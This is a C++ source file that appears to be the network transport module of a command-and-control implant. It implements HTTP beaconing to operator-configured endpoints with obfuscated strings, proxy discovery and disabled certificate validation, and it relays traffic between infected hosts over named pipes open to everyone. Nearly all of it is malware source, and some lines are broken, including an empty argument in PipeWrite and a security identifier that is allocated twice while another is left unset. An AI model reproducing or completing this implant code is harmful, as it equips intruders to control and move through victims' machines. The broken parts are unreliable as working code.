#include <core/include/network.hpp>
namespace Http {

    VOID HttpSendRequest(HINTERNET request, _stream **stream) {
        HEXANE

        void *buffer   = { };
        void *download = { };

        uint32_t read  = 0;
        uint32_t total = 0;
        uint32_t length = 0;
        do {
            if (!(Ctx->win32.WinHttpQueryDataAvailable(request, R_CAST(LPDWORD, &length)))) {
                return_defer(ntstatus);
            }
            if (!buffer) {
                buffer = x_malloc(length + 1);
            }

            if (!download) {
                download = x_malloc(length + 1);
            } else {
                download = x_realloc(download, total + length + 1);
            }

            x_memset(buffer, 0, length + 1);
            if (!Ctx->win32.WinHttpReadData(request, buffer, length, R_CAST(LPDWORD, &read))) {
                return_defer(ntstatus);
            }

            x_memcpy(B_PTR(download) + total, buffer, read);
            ZeroFreePtr(buffer, read);
            total += read;

        } while (length > 0);

        (*stream) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
        (*stream)->buffer = download;
        (*stream)->length = total;

        defer:
    }

    _request_context* CreateRequestContext() {
        HEXANE

        _request_context *req_ctx = R_CAST(_request_context*, x_malloc(sizeof(_request_context)));
        uint32_t n_endpoint = 0;

        if (!Ctx->transport.http->handle) {
            if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                return_defer(ntstatus);
            }
        }

        if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
            return_defer(ntstatus);
        }

        n_endpoint          = Utils::Random::RandomNumber32();
        req_ctx->endpoint   = Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];

        Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
        if (Ctx->transport.b_ssl) {
            Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
        }

        if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
            return_defer(ntstatus);
        }

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            if (req_ctx) {
                x_free(req_ctx);
            }
        }

        return req_ctx;
    }

    _proxy_context* CreateProxyContext(_request_context *req_ctx) {
        HEXANE

        _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));

        if (Ctx->transport.b_proxy) {
            proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
            proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;

            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                return_defer(ntstatus);
            }

            if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
                if (
                    !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
                    !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
                    return_defer(ntstatus);
                }
            }
        } else if (!Ctx->transport.b_envproxy_check) {
            proxy_ctx->autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
            proxy_ctx->autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
            proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
            proxy_ctx->autoproxy.lpvReserved            = nullptr;
            proxy_ctx->autoproxy.dwReserved             = 0;
            proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;

            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
                Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
                Ctx->transport.env_proxy     = x_malloc(Ctx->transport.env_proxylen);

                x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);

            } else {
                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_ctx->proxy_config)) {
                    if (proxy_ctx->proxy_config.lpszProxy != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszProxy) != 0) {
                        proxy_ctx->proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                        proxy_ctx->proxy_info.lpszProxy         = proxy_ctx->proxy_config.lpszProxy;
                        proxy_ctx->proxy_info.lpszProxyBypass   = proxy_ctx->proxy_config.lpszProxyBypass;
                        Ctx->transport.env_proxylen             = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->transport.env_proxy = x_malloc(Ctx->transport.env_proxylen);
                        x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);

                        proxy_ctx->proxy_config.lpszProxy       = nullptr;
                        proxy_ctx->proxy_config.lpszProxyBypass = nullptr;

                    } else if (proxy_ctx->proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszAutoConfigUrl) != 0) {
                        proxy_ctx->autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                        proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
                        proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;

                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
                        Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->transport.env_proxy = x_malloc(Ctx->transport.env_proxylen);
                        x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
                    }
                }
            }
            Ctx->transport.b_envproxy_check = true;
        }

        if (Ctx->transport.env_proxy) {
            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
                return_defer(ntstatus);
            }
        }

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            if (proxy_ctx) {
                x_free(proxy_ctx);
                proxy_ctx = nullptr;
            }
        }

        return proxy_ctx;
    }

    VOID HttpCallback(const _stream *const out, _stream **in) {
        HEXANE
        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21

        _proxy_context *proxy_ctx = { };
        _request_context *req_ctx = { };

        wchar_t *header     = { };
        uint32_t status     = 0;
        uint32_t n_headers  = 0;
        uint32_t n_status   = sizeof(uint32_t);

        // todo: reverting tokens during http operations
        // todo: dynamic method selection/context-based?
        Ctx->transport.http->method = OBFW(L"GET");

        if (
            !(req_ctx = CreateRequestContext()) ||
            !(proxy_ctx = CreateProxyContext(req_ctx))) {
            return_defer(ntstatus);
        }

        if (Ctx->transport.b_ssl) {
            Ctx->transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
                return_defer(ntstatus);
            }
        }

        if (Ctx->transport.http->headers) {
            while (true) {
                if (!Ctx->transport.http->headers[n_headers]) { break; }
                else {

                    header = Ctx->transport.http->headers[n_headers];
                    if (!Ctx->win32.WinHttpAddRequestHeaders(req_ctx->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                        return_defer(ntstatus);
                    }

                    n_headers++;
                }
            }
        }
        if (
            !Ctx->win32.WinHttpSendRequest(req_ctx->req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
            !Ctx->win32.WinHttpReceiveResponse(req_ctx->req_handle, nullptr)) {
            return_defer(ntstatus);
        }

        if (
            !Ctx->win32.WinHttpQueryHeaders(req_ctx->req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
            return_defer(ntstatus);
        }
        if (status != HTTP_STATUS_OK) {
            return_defer(status);
        }

        HttpSendRequest(req_ctx->req_handle, in);

        defer:
        if (req_ctx) {
            if (req_ctx->req_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
            if (req_ctx->conn_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
        }
        if (proxy_ctx) {
            if (proxy_ctx->proxy_config.lpszProxy) { x_free(proxy_ctx->proxy_config.lpszProxy); }
            if (proxy_ctx->proxy_config.lpszProxyBypass) { x_free(proxy_ctx->proxy_config.lpszProxyBypass); }
            if (proxy_ctx->proxy_config.lpszAutoConfigUrl) { x_free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
        }
    }
}

namespace Smb {
    // read first, write second?

    VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
        HEXANE

        if (SmbSecAttr->sid) {
            Ctx->win32.FreeSid(SmbSecAttr->sid);
            SmbSecAttr->sid = nullptr;
        }
        if (SmbSecAttr->sid_low) {
            Ctx->win32.FreeSid(SmbSecAttr->sid_low);
            SmbSecAttr->sid_low = nullptr;
        }
        if (SmbSecAttr->p_acl) {
            x_free(SmbSecAttr->p_acl);
        }
        if (SmbSecAttr->sec_desc) {
            x_free(SmbSecAttr->sec_desc);
        }
    }

    VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
        HEXANE

        SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
        SID_IDENTIFIER_AUTHORITY sid_label = SECURITY_MANDATORY_LABEL_AUTHORITY;
        EXPLICIT_ACCESSA access = { };
        PACL acl = { };

        x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
        x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
            return_defer(ERROR_INVALID_SID);
        }

        access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
        access.grfInheritance = NO_INHERITANCE;
        access.grfAccessMode = SET_ACCESS;

        access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->sid);

        if (
            !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
            return_defer(ERROR_INVALID_SID);
        }

        if (!(SmbSecAttr->p_acl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
            return_defer(ERROR_NOT_ENOUGH_MEMORY);
        }

        if (
            !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
            !Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
            return_defer(ERROR_NO_ACE_CONDITION);
        }

        if (!(SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        if (
            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        defer:
        if (ntstatus == ERROR_SUCCESS) {
            SecAttr->lpSecurityDescriptor   = SmbSecAttr->sec_desc;
            SecAttr->nLength                = sizeof(SECURITY_ATTRIBUTES);
            SecAttr->bInheritHandle         = FALSE;
        }
    }

    BOOL PipeRead(HANDLE handle, _stream *in) {
        HEXANE

        uint32_t read = 0;
        uint32_t total = 0;

        do {
            auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
            if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
                if (ntstatus == ERROR_NO_DATA) {
                    return false;
                }
            }

            total += read;
        }
        while (total < in->length);
        return true;
    }

    BOOL PipeWrite(HANDLE handle, _stream *out) {
        HEXANE

        uint32_t total = 0;
        uint32_t write = 0;

        do {
            auto length = MIN((out->length - total), PIPE_BUFFER_MAX);
            if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, , R_CAST(LPDWORD, &write), nullptr)) {
                return false;
            }

            total += write;
        }
        while (total < out->length);
        return true;
    }

    BOOL PeekClientMessage(HANDLE handle, _stream &stream, uint32_t &offset) {
        HEXANE

        _stream header = { };
        uint32_t current = 0;
        uint32_t read = 0;

        // locate the offset to a client message
        while (true) {
            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(_stream), R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
                return false;
            }

            if (header.peer_id == Ctx->session.peer_id) {
                uint32_t total = sizeof(_stream) + header.length;
                current += total;

                SetFilePointer(handle, total, NULL, FILE_CURRENT);
            } else {
                stream = header;
                offset = current;
                return true;
            }
        }
    }

    BOOL ProcessClientMessage(HANDLE handle, _stream& stream) {
        HEXANE

        uint8_t read = 0;
        stream.buffer = R_CAST(uint8_t*, x_malloc(stream.length));

        if (!Ctx->win32.ReadFile(handle, stream.buffer, stream.length, R_CAST(LPDWORD, &read), NULL)) {
            return false;
        } else {
            return true;
        }
    }

    VOID PeerConnectIngress (_stream *out, _stream **in) {
        HEXANE

        SECURITY_ATTRIBUTES sec_attr    = { };
        SMB_PIPE_SEC_ATTR smb_attr      = { };

        auto peer = Ctx->peers;
        auto head = Ctx->transport.outbound_queue;

        while (peer) {
            if (peer->ingress_name) {
                if (!peer->ingress_handle) {

                    SmbContextInit(&smb_attr, &sec_attr);
                    if (!(peer->ingress_handle = Ctx->win32.CreateNamedPipeW(peer->ingress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                        return_defer(ntstatus);
                    }

                    SmbContextDestroy(&smb_attr);
                    if (!Ctx->win32.ConnectNamedPipe(peer->ingress_handle, nullptr)) {
                        return_defer(ntstatus);
                    }
                }

                _stream stream = { };
                uint32_t offset = 0;

                while (PeekClientMessage(peer->ingress_handle, stream, offset)) {
                    SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);

                    if (!ProcessClientMessage(peer->ingress_handle, stream)) {
                        return_defer(ntstatus);
                    }
                }

                Ctx->win32.SleepEx(500, FALSE);
                SetFilePointer(peer->ingress_handle, 0, NULL, FILE_BEGIN);

                while (head) {
                    if (head->peer_id == peer->peer_id) {
                        // todo: search outbound_queue and find messages for peers

                    }

                    head = head->next;
                }

                peer = peer->next;
                head = Ctx->transport.outbound_queue;
            }
        }

        defer:
    }

    VOID PeerConnectEgress(_stream *out, _stream **in) {
        HEXANE
        // egress handle is set up by the parent and is assigned to us at build time.
        // this indicates that we are an smb peer.

        auto pipename = Ctx->config.EgressPipename;

        if (!(Ctx->config.EgressHandle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (Ctx->config.EgressHandle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {

                if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                    return_defer(ERROR_NOT_READY);
                }
            } else {
                return_defer(ntstatus);
            }
        }

        if (Ctx->win32.PeekNamedPipe(Ctx->config.EgressHandle, nullptr, 0, nullptr, &(*in)->length, nullptr)) {
            if ((*in)->length > 0) {

                if (!Network::Smb::PipeRead(Ctx->config.EgressHandle, *in)) {
                    return_defer(ntstatus);
                }
            } else {
                return_defer(ERROR_INSUFFICIENT_BUFFER);
            }
        }
        if (!Network::Smb::PipeWrite(Ctx->config.EgressHandle, out)) {
            return_defer(ntstatus);
        }

        defer:
    }
}